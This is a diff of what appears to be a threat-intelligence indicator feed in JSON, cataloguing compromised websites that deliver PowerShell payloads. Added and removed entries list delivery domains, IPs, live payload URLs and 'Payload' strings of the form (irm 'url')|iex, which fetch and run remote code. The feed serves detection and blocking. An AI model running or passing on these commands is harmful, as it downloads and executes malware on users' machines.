@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "hackandslashgames.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "IP": [
+      "162.159.135.42"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ef9c80bd652ab34d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/ef9c80bd652ab34d"
+    ],
+    "ReportId": "cmwooi70420ts0omlj0pbm2lo",
+    "ScannedAt": "2026-11-20T07:49:52.529000+00:00"
+  },
+  {
+    "UrlDomain": "liajoffe.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "IP": [
+      "162.241.144.19"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/38ade94b3e931d9d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/38ade94b3e931d9d"
+    ],
+    "ReportId": "cmwooi4ba20ti0omludc2kosv",
+    "ScannedAt": "2026-11-20T07:49:49.061000+00:00"
+  },
+  {
     "UrlDomain": "www.moebelfan.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -12487,50 +12525,5 @@
     ],
     "ReportId": "cmwdakyne02t60omlgkpmg8ab",
     "ScannedAt": "2026-11-12T08:34:39.120000+00:00"
-  },
-  {
-    "UrlDomain": "captivationphotography.com",
-    "DeliveryUrl": [
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
-    ],
-    "IP": [
-      "162.241.252.149"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/startapv2/f9b9bfb54f8b30ec"
-    ],
-    "ReportId": "cmwd9bnf802hk0omlsqvlimv7",
-    "ScannedAt": "2026-11-12T07:59:24.865000+00:00"
-  },
-  {
-    "UrlDomain": "kirara.com.br",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "77.37.83.201"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/013ce88bf8a96d89",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&_v=29907834",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/013ce88bf8a96d89"
-    ],
-    "ReportId": "cmwd95g6w02ga0omlk6zhc06u",
-    "ScannedAt": "2026-11-12T07:54:35.761000+00:00"
   }
 ]
